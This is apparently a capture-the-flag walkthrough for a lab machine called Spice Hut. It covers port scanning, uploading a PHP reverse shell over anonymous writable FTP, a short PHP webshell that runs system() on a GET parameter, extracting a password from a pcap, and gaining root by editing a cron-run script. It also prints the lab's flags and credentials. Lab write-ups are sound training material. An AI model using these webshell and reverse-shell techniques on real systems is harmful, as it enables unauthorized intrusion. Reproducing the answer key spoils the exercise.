# Task 1 Welcome to Spice Hut!

**We are Spice Hut,** a new startup company that just made it big! We offer a variety of spices and club sandwiches (in case you get hungry), but that is not why you are here. To be truthful, we aren't sure if our developers know what they are doing and our security concerns are rising. We ask that you perform a thorough penetration test and try to own root. Good luck!

### What is the secret spicy soup recipe?

`nmap -sS -Pn -p- -T4 -vv 10.10.70.37`

We see ports 21, 22 and 80 open.

Check out the website, no robots.txt, some comments in the source code referencing when they will update, but nothing really stands out.

`gobuster dir --url 10.10.70.37 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 40`

`/files/notice.txt` reveals `Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.`

Potential username `Maya`

Further nmap scans `nmap -sS -Pn -p 22,21,80 -sC -sV -T4 -vv 10.10.70.37` indicated that the FTP site was potentially writable

```
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 61 vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.4.18.254
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDAzds8QxN5Q2TsERsJ98huSiuasmToUDi9JYWVegfTMV4Fn7t6/2ENm/9uYblUv+pLBnYeGo3XQGV23foZIIVMlLaC6ulYwuDOxy6KtHauVMlPRvYQd77xSCUqcM1ov9d00Y2y5eb7S6E7zIQCGFhm/jj5ui6bcr6wAIYtfpJ8UXnlHg5f/mJgwwAteQoUtxVgQWPsmfcmWvhreJ0/BF0kZJqi6uJUfOZHoUm4woJ15UYioryT6ZIw/ORL6l/LXy2RlhySNWi6P9y8UXrgKdViIlNCun7Cz80Cfc16za/8cdlthD1czxm4m5hSVwYYQK3C7mDZ0/jung0/AJzl48X1
|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOKJ0cuq3nTYxoHlMcS3xvNisI5sKawbZHhAamhgDZTM989wIUonhYU19Jty5+fUoJKbaPIEBeMmA32XhHy+Y+E=
|   256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPnFr/4W5WTyh9XBSykso6eSO6tE0Aio3gWM8Zdsckwo
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Maintenance
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

Lets try uploading a remote shell https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

Saving the php file as `shell.php5`, connecting via FTP, change to the ftp directory and `put shell.php5`.
Setup the listener `nc -vnlp 4444`
In a browser navigate to `/files/ftp/shell.php5` and the remote shell is available.

Running as `www-data` from the root directory

`cat recipe.txt`
`Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love.`

Answer: `love`

### What are the contents of user.txt?

A directory `/home/lennie` we don't have access to but the user.txt would presumably be in that.

In `/incidents` there is a `suspicious.pcapng`.  Tshark is not installed, we can't get access to `/var/www/`.
`sudo -l` showed no results

Create a webshell
```php
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
```
Upload it using the FTP and navigate to `/files/ftp/webshell.php?cmd=pwd` to verify it works
`/files/ftp/webshell.php?cmd=cp%20/incidents/suspicious.pcapng%20/var/www/html/files/ftp/suspicious.pcapng`

Grab the file via FTP or browser.

Looking through the PCAP we find a few interesting entries
Filtering on `ip.addr == 192.168.22.139` number `177` we find where data had been exfiltrated, but also capture a sudo attempt on www-data, with the password `c4ntg3t3n0ughsp1c3`.  This could be the actual cred for www-data or lennie's password.  But since entry `180` we see a failure, we can assume it is Lennie's.

`ssh lennie@10.10.70.37` and use the password.
`cat user.txt`

Answer:  `THM{03ce3d619b80ccbfb3b7fc81e46c0e79}`


### What are the contents of root.txt?


Looking at Lennie's Documents, nothing interesting, no hidden files in the profile.
`sudo -l` Lennie doesn't have permission for sudo
Looking at the scripts folder, there is a planner.sh, owned by root, and it runs `/etc/print.sh` owned by Lennie.  We can modify `/etc/print.sh` to get the root flag. This fails when run manually, however further investigation shows that creating a file from `print.sh` (eg: adding a line `date >> /tmp/file.txt`) creates a file in `/tmp/` every minute or so, with root as the owner.


Oddly enough, there is no `/etc/crontab` for this account

Modify `print.sh` with `cat /root/root.txt >> /tmp/root.txt` and wait for it to run.

We could gain root access by dropping a remote shell in `print.sh` and creating a listener.

Answer: `THM{f963aaa6a430f210222158ae15c3d76d}`